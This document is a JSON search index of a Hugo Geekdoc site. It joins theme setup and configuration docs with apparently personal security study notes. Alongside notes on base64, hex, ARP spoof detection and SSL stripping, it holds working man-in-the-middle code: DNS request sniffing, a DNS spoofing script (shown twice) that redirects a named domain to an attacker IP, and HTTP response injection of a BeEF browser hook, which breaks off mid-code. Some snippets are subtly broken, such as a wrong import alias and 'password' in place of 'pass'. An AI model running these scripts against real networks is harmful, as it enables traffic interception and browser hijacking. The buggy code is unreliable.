[{"id":0,"href":"/usage/getting-started/","title":"Getting Started","parent":"Usage","content":"This page tells you how to get started with the Geekdoc theme, including installation and basic configuration.\nInstall requirements Using the theme Option 1: Download pre-build release bundle Option 2: Clone the GitHub repository Install requirements You need a recent version of Hugo for local builds and previews of sites that use Geekdoc. As we are using gulp as pre-processor the normal version of Hugo is sufficient. If you prefer the extended version of Hugo anyway this will work as well. For comprehensive Hugo documentation, see gohugo.io.\nIf you want to use the theme from a cloned branch instead of a release tarball you\u0026rsquo;ll need to install gulp locally and run the default pipeline once to create all required assets.\n# install required packages from package.json npm install # run gulp pipeline to build required assets npx gulp default Using the theme To prepare your new site environment just a few steps are required:\nCreate a new empty Hugo site.\nhugo new site demosite Switch to the root of the new site.\ncd demosite Install the Geekdoc theme from a release bundle (recommended) or from Git branch.\nCreate the minimal required Hugo configuration config.toml. For all configuration options see here.\nbaseURL = \u0026#34;http://localhost\u0026#34; title = \u0026#34;Geekdocs\u0026#34; theme = \u0026#34;hugo-geekdoc\u0026#34; # Geekdoc required configuration pygmentsUseClasses = true pygmentsCodeFences = true disablePathToLower = true # Needed for mermaid shortcodes [markup] [markup.goldmark.renderer] # Needed for mermaid shortcode unsafe = true [markup.tableOfContents] startLevel = 1 endLevel = 9 Test your site.\nhugo server -D Option 1: Download pre-build release bundle Download and extract the latest release bundle into the theme directory.\nmkdir -p themes/hugo-geekdoc/ curl -L https://github.com/thegeeklab/hugo-geekdoc/releases/latest/download/hugo-geekdoc.tar.gz | tar -xz -C themes/hugo-geekdoc/ --strip-components=1 Option 2: Clone the GitHub repository Info\nKeep in mind this method is not recommended and needs some extra steps to get it working. If you want to use the Theme as submodule keep in mind that your build process need to run the described steps as well. Clone the Geekdoc git repository.\ngit clone https://github.com/thegeeklab/hugo-geekdoc.git themes/geekdoc Build required theme assets e.g. CSS files and SVG sprites with gulp.\nnpx gulp default ","description":"This page tells you how to get started with the Geekdoc theme, including installation and basic configuration.\nInstall requirements Using the theme Option 1: Download pre-build release bundle Option 2: Clone the GitHub repository Install requirements You need a recent version of Hugo for local builds and previews of sites that use Geekdoc. As we are using gulp as pre-processor the normal version of Hugo is sufficient. If you prefer the extended version of Hugo anyway this will work as well."},{"id":1,"href":"/htb/","title":"Htb","parent":"Documentation","content":"","description":""},{"id":2,"href":"/usage/","title":"Usage","parent":"Documentation","content":"","description":""},{"id":3,"href":"/usage/configuration/","title":"Configuration","parent":"Usage","content":" Site configuration Page configuration Site configuration TOML baseURL = \u0026#34;http://localhost\u0026#34; title = \u0026#34;Geekdocs\u0026#34; theme = \u0026#34;hugo-geekdoc\u0026#34; # Required to get well formatted code blocks pygmentsUseClasses = true pygmentsCodeFences = true disablePathToLower = true enableGitInfo = true [markup] [markup.goldmark.renderer] # Needed for mermaid shortcode unsafe = true [markup.tableOfContents] startLevel = 1 endLevel = 9 [params] # (Optional, default 6) Set how many table of contents levels to be showed on page. # Use false to hide ToC, note that 0 will default to 6 (https://gohugo.io/functions/default/) # You can also specify this parameter per page in front matter. geekdocToC = 3 # (Optional, default static/brand.svg) Set the path to a logo for the Geekdoc # relative to your \u0026#39;static/\u0026#39; folder. geekdocLogo = \u0026#34;logo.png\u0026#34; # (Optional, default false) Render menu from data file im \u0026#39;data/menu/main.yaml\u0026#39;. geekdocMenuBundle = true # (Optional, default true) Show page navigation links at the bottom of each # docs page (bundle menu only). geekdocNextPrev = false # (Optional, default true) Show a breadcrumb navigation bar at the top of each docs page. # You can also specify this parameter per page in front matter. geekdocBreadcrumb = false # (Optional, default none) Set source repository location. Used for \u0026#39;Edit this page\u0026#39; links. # You can also specify this parameter per page in front matter. geekdocRepo = \u0026#34;https://github.com/thegeeklab/hugo\u0026#34; # (Optional, default none) Enable \u0026#39;Edit this page\u0026#39; links. Requires \u0026#39;GeekdocRepo\u0026#39; param # and path must point to \u0026#39;content\u0026#39; directory of repo. # You can also specify this parameter per page in front matter. geekdocEditPath = \u0026#34;edit/master/exampleSite/content\u0026#34; # (Optional, default true) Enables search function with flexsearch. # Index is built on the fly and might slowdown your website. geekdocSearch = false # (Optional, default false) Display search results with the parent folder as prefix. This # option allows you to distinguish between files with the same name in different folders. # NOTE: This parameter only applies when \u0026#39;geekdocSearch = true\u0026#39;. geekdocSearchShowParent = true # (Optional, default none) Add a link to your Legal Notice page to the site footer. # It can be either a remote url or a local file path relative to your content directory. geekdocLegalNotice = \u0026#34;https://blog.example.com/legal\u0026#34; # (Optional, default none) Add a link to your Privacy Policy page to the site footer. # It can be either a remote url or a local file path relative to your content directory. geekdocPrivacyPolicy = \u0026#34;/privacy\u0026#34; # (Optional, default true) Add an anchor link to headlines. geekdocAnchor = true # (Optional, default true) Copy anchor url to clipboard on click. geekdocAnchorCopy = true YAML --- baseURL: \u0026#34;http://localhost\u0026#34; title: \u0026#34;Geekdocs\u0026#34; theme: \u0026#34;hugo-geekdoc\u0026#34; # Required to get well formatted code blocks pygmentsUseClasses: true pygmentsCodeFences: true disablePathToLower: true enableGitInfo: true markup: goldmark: # Needed for mermaid shortcode renderer: unsafe: true tableOfContents: startLevel: 1 endLevel: 9 params: # (Optional, default 6) Set how many table of contents levels to be showed on page. # Use false to hide ToC, note that 0 will default to 6 (https://gohugo.io/functions/default/) # You can also specify this parameter per page in front matter. geekdocToC: 3 # (Optional, default static/brand.svg) Set the path to a logo for the Geekdoc # relative to your \u0026#39;static/\u0026#39; folder. geekdocLogo: logo.png # (Optional, default false) Render menu from data file im \u0026#39;data/menu/main.yaml\u0026#39;. # See also https://geekdocs.de/usage/menus/#bundle-menu geekdocMenuBundle: true # (Optional, default true) Show page navigation links at the bottom of each # docs page (bundle menu only). geekdocNextPrev: false # (Optional, default true) Show a breadcrumb navigation bar at the top of each docs page. # You can also specify this parameter per page in front matter. geekdocBreadcrumb: false # (Optional, default none) Set source repository location. Used for \u0026#39;Edit this page\u0026#39; links. # You can also specify this parameter per page in front matter. geekdocRepo: \u0026#34;https://github.com/thegeeklab/hugo-geekdoc\u0026#34; # (Optional, default none) Enable \u0026#34;Edit this page\u0026#34; links. Requires \u0026#39;GeekdocRepo\u0026#39; param # and path must point to \u0026#39;content\u0026#39; directory of repo. # You can also specify this parameter per page in front matter. geekdocEditPath: edit/master/exampleSite/content # (Optional, default true) Enables search function with flexsearch. # Index is built on the fly and might slowdown your website. geekdocSearch: false # (Optional, default false) Display search results with the parent folder as prefix. This # option allows you to distinguish between files with the same name in different folders. # NOTE: This parameter only applies when \u0026#39;geekdocSearch: true\u0026#39;. geekdocSearchShowParent: true # (Optional, default none) Add a link to your Legal Notice page to the site footer. # It can be either a remote url or a local file path relative to your content directory. geekdocLegalNotice: \u0026#34;https://blog.example.com/legal\u0026#34; # (Optional, default none) Add a link to your Privacy Policy page to the site footer. # It can be either a remote url or a local file path relative to your content directory. geekdocPrivacyPolicy: \u0026#34;/privacy\u0026#34; # (Optional, default true) Add an anchor link to headlines. geekdocAnchor: true # (Optional, default true) Copy anchor url to clipboard on click. geekdocAnchorCopy: true Page configuration TOML # Set type to \u0026#39;posts\u0026#39; if you want to render page as blogpost type = \u0026#34;posts\u0026#34; # Set page weight to re-arrange items in file-tree menu. weight = 10 # Set how many table of contents levels to be showed on page. geekdocToC = 3 # Set a description for the current page. This will be shown in toc-trees objects. geekdocDescription = # Show a breadcrumb navigation bar at the top of each docs page. geekdocBreadcrumb = false # Set source repository location. geekdocRepo = \u0026#34;https://github.com/thegeeklab/hugo-geekdoc\u0026#34; # Enable \u0026#34;Edit this page\u0026#34; links. Requires \u0026#39;GeekdocRepo\u0026#39; param and path must point # to \u0026#39;content\u0026#39; directory of repo. geekdocEditPath = \u0026#34;edit/master/exampleSite/content\u0026#34; # Used for \u0026#39;Edit this page\u0026#39; link, set to \u0026#39;.File.Path\u0026#39; by default. # Can be overwritten by a path relative to \u0026#39;geekdocEditPath\u0026#39; geekdocFilePath = # Set to mark page as flat section (file-tree menu only). geekdocFlatSection = true # Set true to hide page or section from side menu (file-tree menu only). geekdocHidden = true # Set false to show this page as a file-tree menu entry when you want it to be hidden in the sidebar. # NOTE: Only applies when \u0026#39;geekdocHidden = true\u0026#39;. geekdocHiddenTocTree = true # Set to true to make a section foldable in side menu. geekdocCollapseSection = true # Add an anchor link to headlines. geekdocAnchor = true YAML # Set type to \u0026#39;posts\u0026#39; if you want to render page as blogpost. type: \u0026#34;posts\u0026#34; # Set page weight to re-arrange items in file-tree menu. weight: 10 # Set how many table of contents levels to be showed on page. geekdocToC: 3 # Set a description for the current page. This will be shown in toc-trees objects. geekdocDescription: # Show a breadcrumb navigation bar at the top of each docs page. geekdocBreadcrumb: false # Set source repository location. geekdocRepo: \u0026#34;https://github.com/thegeeklab/hugo-geekdoc\u0026#34; # Enable \u0026#34;Edit this page\u0026#34; links. Requires \u0026#39;GeekdocRepo\u0026#39; param and path must point # to \u0026#39;content\u0026#39; directory of repo. geekdocEditPath: \u0026#34;edit/master/exampleSite/content\u0026#34; # Used for \u0026#39;Edit this page\u0026#39; link, set to \u0026#39;.File.Path\u0026#39; by default. # Can be overwritten by a path relative to \u0026#39;geekdocEditPath\u0026#39; geekdocFilePath: # Set to mark page as flat section (file-tree menu only). geekdocFlatSection: true # Set true to hide page or section from side menu (file-tree menu only). geekdocHidden: true # Set false to show this page as a file-tree menu entry when you want it to be hidden in the sidebar. # NOTE: Only applies when \u0026#39;geekdocHidden: true\u0026#39;. geekdocHiddenTocTree: true # Set to true to make a section foldable in side menu. geekdocCollapseSection: true # Add an anchor link to headlines. geekdocAnchor: true ","description":"Site configuration Page configuration Site configuration TOML baseURL = \u0026#34;http://localhost\u0026#34; title = \u0026#34;Geekdocs\u0026#34; theme = \u0026#34;hugo-geekdoc\u0026#34; # Required to get well formatted code blocks pygmentsUseClasses = true pygmentsCodeFences = true disablePathToLower = true enableGitInfo = true [markup] [markup.goldmark.renderer] # Needed for mermaid shortcode unsafe = true [markup.tableOfContents] startLevel = 1 endLevel = 9 [params] # (Optional, default 6) Set how many table of contents levels to be showed on page."},{"id":4,"href":"/shortcodes/","title":"Shortcodes","parent":"Documentation","content":"","description":""},{"id":5,"href":"/htb/first/","title":"First writeup","parent":"Htb","content":"Hack the box writeup\n","description":"Hack the box writeup"},{"id":6,"href":"/docs/getting-started/","title":"Getting Started","parent":"Docs","content":"Testing 123\n","description":"Testing 123"},{"id":7,"href":"/posts/","title":"News","parent":"Documentation","content":"","description":""},{"id":8,"href":"/","title":"Documentation","parent":"","content":" Geekdoc is a simple Hugo theme for documentations. It is intentionally designed as a fast and lean theme and may not fit the requirements of complex projects. If a more feature-complete theme is required there are a lot of got alternatives out there. You can find a demo and the full documentation at https://geekdocs.de.\nFeatures Clean and simple design Light and mobile-friendly Easy customization Zero initial configuration Handy shortcodes ","description":" Geekdoc is a simple Hugo theme for documentations. It is intentionally designed as a fast and lean theme and may not fit the requirements of complex projects. If a more feature-complete theme is required there are a lot of got alternatives out there. You can find a demo and the full documentation at https://geekdocs.de.\nFeatures Clean and simple design Light and mobile-friendly Easy customization Zero initial configuration Handy shortcodes "},{"id":9,"href":"/posts/initial-release/","title":"Initial release","parent":"News","content":"This is the first release of the Geekdoc theme.\nDolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e. In pro quints consequent, denim fastidious copious quo ad. Stet probates in duo.\n","description":"This is the first release of the Geekdoc theme.\nDolor sit, sumo unique argument um no. Gracie nominal id xiv. Romanesque acclimates investiture. Ornateness bland it ex enc, est yeti am bongo detract re. Pro ad prompts feud gait, quid exercise emeritus bis e. In pro quints consequent, denim fastidious copious quo ad. Stet probates in duo."},{"id":10,"href":"/posts/hello_geekdoc/","title":"Hello Geekdoc","parent":"News","content":" Penetration Testing: A Hands-On Introduction to Hacking The Web Application Hackers Handbook Computer Security: A Hands-on Approach Black Hat Python Buffer Overflow Attacks - Detect Exploit Prevent Cross Site Scripting Attacks Xss Exploits and Defense Cybersecurity - Attack and Defense Strategies Fuzzing Brute Force Vulnerability Discovery Hacking Exposed Linux Hacking The Art of Exploitation Kali Linux an Ethical Hackers Cookbook Mastering Kali Linux for Advanced Penetration Testing Penetration Testing A Hands On Introduction to Hacking Python Penetration Testing Essentials RTFM red team field manual TCP IP Guide Oct 2005 The Basics of Hacking and Penetration Testing The Basics of Web Hacking - Tools and Techniques to Attack the Web Understanding Network Hacks_ Attack and Defense With Python Violent Python - A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers Wireshark for Security Professionals Wireshark - Practical packet analysis to Solve Real World Problems ","description":" Penetration Testing: A Hands-On Introduction to Hacking The Web Application Hackers Handbook Computer Security: A Hands-on Approach Black Hat Python Buffer Overflow Attacks - Detect Exploit Prevent Cross Site Scripting Attacks Xss Exploits and Defense Cybersecurity - Attack and Defense Strategies Fuzzing Brute Force Vulnerability Discovery Hacking Exposed Linux Hacking The Art of Exploitation Kali Linux an Ethical Hackers Cookbook Mastering Kali Linux for Advanced Penetration Testing Penetration Testing A Hands On Introduction to Hacking Python Penetration Testing Essentials RTFM red team field manual TCP IP Guide Oct 2005 The Basics of Hacking and Penetration Testing The Basics of Web Hacking - Tools and Techniques to Attack the Web Understanding Network Hacks_ Attack and Defense With Python Violent Python - A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers Wireshark for Security Professionals Wireshark - Practical packet analysis to Solve Real World Problems "},{"id":11,"href":"/data/base64_encoding/","title":"Base64","parent":"Data","content":"Base-64 encoding is a way encoding binary data into ASCII text so that it\u0026rsquo;s more easily transmitted in things like e-mail and HTML form data.\nEach Base64 digit represents exactly 6 bits of data. Three 8-bit bytes (i.e., a total of 24 bits) can therefore be represented by four 6-bit Base64 digits.\nIf you have an ASCI string of 3 characters (=3 bytes) it turns into 24 bits, interpreted as 3 groups of 8 bits.\nIf you then break them up into 4 groups of 6 bits you now have 4 numbers within 0 and 63.\nThen use the lookup table below.\nIf you have something other then 3 bytes, for example say you have 4 bytes of data for the input, then base64 end with two equal signs (==) to indicate it had to add two characters of padding. If you have 5 bytes you have 1 equal sign. If you have 6 bytes there are no equal signs, indicating the input fits neatly into base64 with no need for padding.\nBase64 is not encrypting, it is not hiding anything. It is just another way to represent data.\nIf for example you would like to email someone an executable you could send the encoded binary data:\nwith open (\u0026#34;file.exe\u0026#34;,\u0026#34;rb\u0026#34;) as f: data = f.read() print data.encode(\u0026#34;base64\u0026#34;) ADeFhAAIAAAAAAAAAAAAAAAqB0AAAAAAABJEigA\\ nAAAAAIcEAAAAAAAA9F0IACA4HgAs7gIACcADAP2 VAQDgHgAAqB0AAAAAAABJEigAAAAAAIcEAAAA\\ nAAAAqB0AAAAAAADRFigAAAAAAMcEAAAAAAAAApYB ACywAADEzygAIAAAAAAAAAAAAAAAqB0AAAAA\\nAAC Or decoding:\ndata = \u0026#34;VGhpcyBpcyB0b28gZWFzeQ==\u0026#34; data.decode(\u0026#34;base64\u0026#34;) \u0026#39;This is too easy\u0026#39; Example of decoding something that has been encoded several times:\n#!/usr/bin/env python import base64 a = \u0026#39;VkVjNWRtRXpUV2RhTWpsMldrRTlQUT09\u0026#39; def decodeit(data): return data.decode(\u0026#34;base64\u0026#34;) while True: try: a = decodeit(a) print(a) # we probably found the solution if we get a padding error so exit except: exit() Output would be:\nVEc5dmEzTWdaMjl2WkE9PQ== TG9va3MgZ29vZA== Looks good More details: http://www.hcidata.info/base64.htm\n","description":"Base-64 encoding is a way encoding binary data into ASCII text so that it\u0026rsquo;s more easily transmitted in things like e-mail and HTML form data.\nEach Base64 digit represents exactly 6 bits of data. Three 8-bit bytes (i.e., a total of 24 bits) can therefore be represented by four 6-bit Base64 digits.\nIf you have an ASCI string of 3 characters (=3 bytes) it turns into 24 bits, interpreted as 3 groups of 8 bits."},{"id":12,"href":"/data/","title":"Data","parent":"Documentation","content":"","description":""},{"id":13,"href":"/arp/","title":"Arp","parent":"Documentation","content":"","description":""},{"id":14,"href":"/arp/arp_spoof_detector/","title":"ARP spoof detection","parent":"Arp","content":"In order to detect if we are under attack we can use following code. It will check if the MAC address (.hwsrc field in ARP reply packet) that is associated with the spoofed IP address that the attacker is sending with the packet (.psrc field in ARP reply packet) differs from what we get back (=real mac address) when we run get_mac function.\nSome words on defense: https://security.stackexchange.com/questions/161173/how-exactly-do-you-protect-against-arp-spoofing-in-large-lans\n#!/usr/bin/env python import scapy.all as scapy_packet def get_mac(ip): arp_request = scapy.ARP(pdst=ip) broadcast = scapy.Ether(dst=\u0026#34;ff:ff:ff:ff:ff:ff\u0026#34;) arp_request_broadcast = broadcast/arp_request answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] if answered_list: return answered_list[0][1].hwsrc else: return None def sniff(interface): scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) def process_sniffed_packet(packet): if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2: try: real_mac = get_mac(packet[scapy.ARP].psrc) response_mac = packet[scapy.ARP].hwsrc if real_mac != response_mac: print(\u0026#34;[+] Arp spoof attack detected!\u0026#34;) except IndexError: password sniff(\u0026#34;enp7s0\u0026#34;) ","description":"In order to detect if we are under attack we can use following code. It will check if the MAC address (.hwsrc field in ARP reply packet) that is associated with the spoofed IP address that the attacker is sending with the packet (.psrc field in ARP reply packet) differs from what we get back (=real mac address) when we run get_mac function.\nSome words on defense: https://security.stackexchange.com/questions/161173/how-exactly-do-you-protect-against-arp-spoofing-in-large-lans\n#!/usr/bin/env python import scapy."},{"id":15,"href":"/data/binary/","title":"Binary","parent":"Data","content":"Binary is Base 2, unlike our Decimal counting system which is Base 10. In other words, Binary has only 2 different numerals (0 and 1) to denote a value, unlike Decimal which has 10 numerals (0,1,2,3,4,5,6,7,8 and 9). A value in binary is sometimes represented by prepending the prefix 0b to the value.\nExample: 0b01011101\n","description":"Binary is Base 2, unlike our Decimal counting system which is Base 10. In other words, Binary has only 2 different numerals (0 and 1) to denote a value, unlike Decimal which has 10 numerals (0,1,2,3,4,5,6,7,8 and 9). A value in binary is sometimes represented by prepending the prefix 0b to the value.\nExample: 0b01011101"},{"id":16,"href":"/http/","title":"Http","parent":"Documentation","content":"","description":""},{"id":17,"href":"/http/ssl_stripping/","title":"SSL stripping","parent":"Http","content":"https://moxie.org/software/sslstrip/\nSslstrip requires that the connection between the client and the sslstrip instance is done over plain HTTP.\nThe connection from sslstrip to the webserver can be either HTTP and HTTPS.\nThis means that if the client first requests the site with plain HTTP then sslstrip works. If instead the clients starts already with HTTPS since it either knows that the site is only accessible by HTTPS or if the browser enforces HTTPS because of a HSTS policy (preloaded or from earlier visits) then sslstrip will not work.\nClarification:\nThe attacker sits between the victim and a server. When the attackers receives an HTTP request from the victim, the attacker sends the request to the server using HTTPS. When the attacker receives the response from the server, it strips away the HTTPS links and then forwards the response to the victim using HTTP.\nIt can strip all this data because it is the attacker who has initiated the encrypted channel with the webserver, NOT the client. The client is only spoon fed HTTP data. Sslstrip analyses the response headers and\nremoves accept-encoding removes if-modified-since\nThis is so the client has to make a full request to the server, even if the page hasn\u0026rsquo;t been modified. This header needs to be removed because otherwise there is no complete request to the server and nothing to intercept.\nremoves cache-control\nThis is for the same reason as if-modified-since, so the client doesn\u0026rsquo;t try to load the page from a cache and avoid making a complete request to the request to the server.\nchanges link in Location header to HTTP\n","description":"https://moxie.org/software/sslstrip/\nSslstrip requires that the connection between the client and the sslstrip instance is done over plain HTTP.\nThe connection from sslstrip to the webserver can be either HTTP and HTTPS.\nThis means that if the client first requests the site with plain HTTP then sslstrip works. If instead the clients starts already with HTTPS since it either knows that the site is only accessible by HTTPS or if the browser enforces HTTPS because of a HSTS policy (preloaded or from earlier visits) then sslstrip will not work."},{"id":18,"href":"/data/ascii/","title":"ASCII","parent":"Data","content":"\nCharacter set Often used to represent english language characters. Originally it was 7-bit binary, which gave us 128 unique characters. The current standard is 8-bit (1 byte) or equivalently 2 hex digits per character. Computers can only understand numbers, so an ASCII code is the numerical representation of a character such as \u0026lsquo;a\u0026rsquo; or \u0026lsquo;1\u0026rsquo;.\nExample:\ncharacter \u0026ldquo;1\u0026rdquo; hex 0x31 first nibble = 3 which is 0011 in binary (count the weight of the columns: 8421) second nibble = 1 = which is 0001 in binary (count the weight of the columns: 8421) The full byte binary value is 0011 0001 which is 49 in decimal (32+16+1) The key thing to remember: the character \u0026ldquo;1\u0026rdquo; is NOT the same thing as the number 1.\nSo if you have a character \u0026ldquo;1\u0026rdquo; in a file, it is not stored as a single bit 1. It is stored as the byte 0x31 that can be looked up in the table.\n","description":"Character set Often used to represent english language characters. Originally it was 7-bit binary, which gave us 128 unique characters. The current standard is 8-bit (1 byte) or equivalently 2 hex digits per character. Computers can only understand numbers, so an ASCII code is the numerical representation of a character such as \u0026lsquo;a\u0026rsquo; or \u0026lsquo;1\u0026rsquo;.\nExample:\ncharacter \u0026ldquo;1\u0026rdquo; hex 0x31 first nibble = 3 which is 0011 in binary (count the weight of the columns: 8421) second nibble = 1 = which is 0001 in binary (count the weight of the columns: 8421) The full byte binary value is 0011 0001 which is 49 in decimal (32+16+1) The key thing to remember: the character \u0026ldquo;1\u0026rdquo; is NOT the same thing as the number 1."},{"id":19,"href":"/dns/","title":"Dns","parent":"Documentation","content":"","description":""},{"id":20,"href":"/dns/dns_request_sniffing/","title":"DNS request sniffing","parent":"Dns","content":"After we become the mitm we can sniff the DNS Question Record\u0026rsquo;s QNAME field.\nI am using netfilterqueue here, but it could be done without it as well because we are not modifying any packets on the fly, we are only inspecting.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\niptables -I FORWARD -j NFQUEUE --queue-num 0 Or without arp spoofing on local machine:\niptables -I OUTPUT -j NFQUEUE --queue-num 0 iptables -I INPUT -j NFQUEUE --queue-num 0 Full code:\nimport netfilterqueue import scapy.all as scapy def process_packet(packet): if packet.get_payload: try: scapy_packet = scapy.IP(packet.get_payload()) finally: if scapy_packet: if scapy_packet.haslayer(scapy.DNSQR): qname = scapy_packet[scapy.DNSQR].qname print(qname) packet.accept() queue = netfilterqueue.NetfilterQueue() queue.bind(0, process_packet) queue.run() ","description":"After we become the mitm we can sniff the DNS Question Record\u0026rsquo;s QNAME field.\nI am using netfilterqueue here, but it could be done without it as well because we are not modifying any packets on the fly, we are only inspecting.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\niptables -I FORWARD -j NFQUEUE --queue-num 0 Or without arp spoofing on local machine:"},{"id":21,"href":"/dns/dns_spoofing/","title":"DNS spoofing","parent":"Dns","content":"After we become the mitm we can spoof DNS answers, by modifying the rdata field in the DNS Response request packet.\nAfter spoofing the rdata field will contain a spoofed ip address of a attacker server instead of the original servers IP address.\nFor this we need to modify packets on the fly. With scapy alone this is not possible, we need to use NetfilterQueue.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\necho \u0026#39;1\u0026#39; \u0026gt; /proc/sys/net/ipv4/ip_forward iptables -I FORWARD -j NFQUEUE --queue-num 0 Or without arp spoofing on local machine:\niptables -I OUTPUT -j NFQUEUE --queue-num 0 iptables -I INPUT -j NFQUEUE --queue-num 0 import netfilterqueue from scapy.all import IP import scapy.all as scapy def process_packet(packet): scapy_packet = scapy.IP(packet.get_payload()) if scapy_packet.haslayer(scapy.DNSRR): qname = scapy_packet[scapy.DNSQR].qname if \u0026#34;nrc.nl\u0026#34; in qname: print(\u0026#34;[+] Spoofing target\u0026#34;) answer = scapy.DNSRR(rrname=qname, rdata=\u0026#34;192.168.178.12\u0026#34;) scapy_packet[scapy.DNS].an = answer scapy_packet[scapy.DNS].ancount = 1 del scapy_packet[scapy.IP].len del scapy_packet[scapy.IP].chksum del scapy_packet[scapy.UDP].chksum del scapy_packet[scapy.UDP].len packet.set_payload(str(scapy_packet)) packet.accept() queue = netfilterqueue.NetfilterQueue() queue.bind(0, process_packet) queue.run() ","description":"After we become the mitm we can spoof DNS answers, by modifying the rdata field in the DNS Response request packet.\nAfter spoofing the rdata field will contain a spoofed ip address of a attacker server instead of the original servers IP address.\nFor this we need to modify packets on the fly. With scapy alone this is not possible, we need to use NetfilterQueue.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:"},{"id":22,"href":"/spoofing/dns_spoofing/","title":"DNS spoofing","parent":"Spoofing","content":"After we become the mitm we can spoof DNS answers, by modifying the rdata field in the DNS Response request packet.\nAfter spoofing the rdata field will contain a spoofed ip address of a attacker server instead of the original servers IP address.\nFor this we need to modify packets on the fly. With scapy alone this is not possible, we need to use NetfilterQueue.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\necho \u0026#39;1\u0026#39; \u0026gt; /proc/sys/net/ipv4/ip_forward iptables -I FORWARD -j NFQUEUE --queue-num 0 Or without arp spoofing on local machine:\niptables -I OUTPUT -j NFQUEUE --queue-num 0 iptables -I INPUT -j NFQUEUE --queue-num 0 import netfilterqueue from scapy.all import IP import scapy.all as scapy def process_packet(packet): scapy_packet = scapy.IP(packet.get_payload()) if scapy_packet.haslayer(scapy.DNSRR): qname = scapy_packet[scapy.DNSQR].qname if \u0026#34;nrc.nl\u0026#34; in qname: print(\u0026#34;[+] Spoofing target\u0026#34;) answer = scapy.DNSRR(rrname=qname, rdata=\u0026#34;192.168.178.12\u0026#34;) scapy_packet[scapy.DNS].an = answer scapy_packet[scapy.DNS].ancount = 1 del scapy_packet[scapy.IP].len del scapy_packet[scapy.IP].chksum del scapy_packet[scapy.UDP].chksum del scapy_packet[scapy.UDP].len packet.set_payload(str(scapy_packet)) packet.accept() queue = netfilterqueue.NetfilterQueue() queue.bind(0, process_packet) queue.run() ","description":"After we become the mitm we can spoof DNS answers, by modifying the rdata field in the DNS Response request packet.\nAfter spoofing the rdata field will contain a spoofed ip address of a attacker server instead of the original servers IP address.\nFor this we need to modify packets on the fly. With scapy alone this is not possible, we need to use NetfilterQueue.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:"},{"id":23,"href":"/data/hex/","title":"Hex","parent":"Data","content":"Hexadecimal is a base 16 system used to simplify how binary is represented.\nA hex digit can be any of the following 16 digits: 0 1 2 3 4 5 6 7 8 9 A B C D E F.\nEvery HEX digit is represented by a sequence of 4 bits (also sometimes called a \u0026ldquo;nibble\u0026rdquo;).\n4 bits is exactly half of a byte, which is 8 bits.\nA value in HEX is often represented by prepending the prefix 0x to the value.\n0x1F is pronounced as: \u0026ldquo;hex-one-f\u0026rdquo;\nAn 8-bit binary number can be written using only two different hex digits - one hex digit for each nibble (or group of 4-bits).\nIt is much easier to write numbers as hex than to write them as binary numbers.\nHex codes are used in many areas of computing to simplify binary codes. It is important to note that computers do not use hexadecimal - it is used by humans to shorten binary to a more easily understandable form. Hexadecimal is translated into binary for computer use. Some examples of where hex is used include:\ncolour references assembly language programs error messages Converting between binary and hexadecimal:\nConverting between decimal and hexadecimal:\n","description":"Hexadecimal is a base 16 system used to simplify how binary is represented.\nA hex digit can be any of the following 16 digits: 0 1 2 3 4 5 6 7 8 9 A B C D E F.\nEvery HEX digit is represented by a sequence of 4 bits (also sometimes called a \u0026ldquo;nibble\u0026rdquo;).\n4 bits is exactly half of a byte, which is 8 bits.\nA value in HEX is often represented by prepending the prefix 0x to the value."},{"id":24,"href":"/http/http_code_injection/","title":"HTTP code injection \u0026 BeEF","parent":"Http","content":"After we become the [mitm][arp_cache_poisoning] we can modify HTTP responses by changing the Raw data on the fly.\n[arp_cache_poisoning]: https://jwever.bitbucket.io/lan/exploitation/mitm/arp_cache_poisoning/\nSince most clients will request [content encoding][http_compression] (by adding a \u0026ldquo;Accept-Encoding\u0026rdquo; header), the HTTP response data (scapy.Raw layer) will look like gibberish.\nThis is is because the data is GZIPPED most of the time. To get around this we can simply delete this header from the HTTP request!\n[http_compression]: https://en.wikipedia.org/wiki/HTTP_compression\nWe also need to make sure we change the size of the \u0026ldquo;Content-Length\u0026rdquo; value to match with our injected code.\nOtherwise the client browser will not accept the server response.\nIn the below example code we then use BeEF on our attacker machine. BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. The key to success with BeEF is to \u0026ldquo;hook\u0026rdquo; a browser. This basically means that we need the victim to visit a vulnerable web app (or as shown in the below code example just by browsing to a HTTP website that has a particular string in the body text). This injected code in the \u0026ldquo;hooked\u0026rdquo; browser then responds to commands from the BeEF server. From there, we can do a number of malicious things on the victim\u0026rsquo;s computer.\nOn Parrot OS i first opened BeEF Framework and then logged in with the default credentials for BeEF: beef/beef at: http://localhost:3000/ui/authentication\nIn the below example we are modifying HTTP responses and injecting the BeEF Hook javascript code into it. Evil stuff :-P\nI successfully tested all this on a Windows 10 victim PC with Chrome browser by visiting a HTML site that had a particular string in the body and replacing this with injected code.\nI then verified the browser was hooked in BeEF on my attacker machine. Then i succesfully send a JS alert via BeEF (commands \u0026gt; browser \u0026gt; hooked domain \u0026gt; create alert dialog).\n# !/usr/bin/env python import netfilterqueue import scapy.all as scapy import re ack_list = [] def set_load(packet, load): packet[scapy.Raw].load = load del packet[scapy.IP].len del packet[scapy.IP].chksum del packet[scapy.TCP].chksum return packet def process_packet(packet): scapy_packet = scapy.IP(packet.get_payload()) if scapy_packet.haslayer(scapy.Raw): load = scapy_packet[scapy.Raw].load if scapy_packet[scapy.TCP].dport == 80: print(\u0026#34;[+] Request\u0026#34;) load = re.sub(\u0026#34;Accept-Encoding:.*?\\\\r\\\\n\u0026#34;, \u0026#34;\u0026#34;, scapy_packet[scapy.Raw].load) elif scapy_packet[scapy.TCP].sport == 80: print(\u0026#34;[+] Response\u0026#34;) print(scapy_packet.show()) injection_code = \u0026#39;\u0026lt;script 